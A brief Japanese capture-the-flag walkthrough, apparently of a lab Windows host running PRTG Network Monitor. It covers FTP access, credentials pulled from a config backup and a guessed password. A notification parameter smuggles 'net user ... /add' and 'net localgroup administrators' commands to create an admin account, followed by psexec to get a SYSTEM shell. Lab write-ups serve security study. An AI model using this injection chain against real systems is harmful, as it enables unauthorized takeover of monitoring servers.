# 1. Port scan
$ip=10.10.10.152

sudo nmap -sC -sV $ip

![fa9056ae97cc1f4a018989b1ab8758a6.png](../_resources/fa9056ae97cc1f4a018989b1ab8758a6.png)

FTPとアクセス

user.txtをダウンロード

![9c7387e236879f6109fc778958066760.png](../_resources/9c7387e236879f6109fc778958066760.png)

 `cd Paessler`

`cd ./"PRTG Network Monitor"`


nmapで検出したサービス名と同じディレクトリを発見

バックアップデータをダウンロード

![631bd6e0a4b0f01c01dc659089242aaa.png](../_resources/631bd6e0a4b0f01c01dc659089242aaa.png)

バックアップを確認した結果

ファイル内のkcredentialを表示した結果ユーザ名とパスワードを発見

![8dfe2f19e004d2edd065cd7c9bc91caa.png](../_resources/8dfe2f19e004d2edd065cd7c9bc91caa.png)

記載してるユーザ情報でログインを試したが失敗

![d1c0f3386449415d710e8c67f61322f6.png](../_resources/d1c0f3386449415d710e8c67f61322f6.png)

パスワードは PrTg@dmin2018
ではなくPrTg@dmin2019と推測

![2f6b29b3a0646ad3a86c086fafabeb40.png](../_resources/2f6b29b3a0646ad3a86c086fafabeb40.png)

ログイン成功

![53f6aee3f9146c7ff86701b83b2c3013.png](../_resources/53f6aee3f9146c7ff86701b83b2c3013.png)

setup→

Account Settings →

Notifications→

Add new Notification

![94a809760f8a5f772e7cb1af9c5decf9.png](../_resources/94a809760f8a5f772e7cb1af9c5decf9.png)

 program file Demo exe notification – outfile.ps1 

parameterにtest.txt;net user pentestop P3nT3st! /add;net localgroup administrators pentestop /add

username prtgadmin

password PrTg@dmin2018 wonyuuryoku

![cbde80e4a400777524f6e963e918884f.png](../_resources/cbde80e4a400777524f6e963e918884f.png)

作成したNotificationを実行

![bfba5762ac2138df97a5922022fc8968.png](../_resources/bfba5762ac2138df97a5922022fc8968.png)

pentestopユーザを作成


`smbmap -H 10.10.10.152 -u pentestop -p 'P3nT3st!'` 

![1a5ec544d7e4ed8939519bb0567bac9e.png](../_resources/1a5ec544d7e4ed8939519bb0567bac9e.png)

 `python3 psexec.py 'pentestop:P3nT3st!@10.10.10.152'`

![95ee0d18ab01d774214508f076c59022.png](../_resources/95ee0d18ab01d774214508f076c59022.png)

rootを取得

![6a5c94e8da760a84627b33b47e9202c2.png](../_resources/6a5c94e8da760a84627b33b47e9202c2.png)
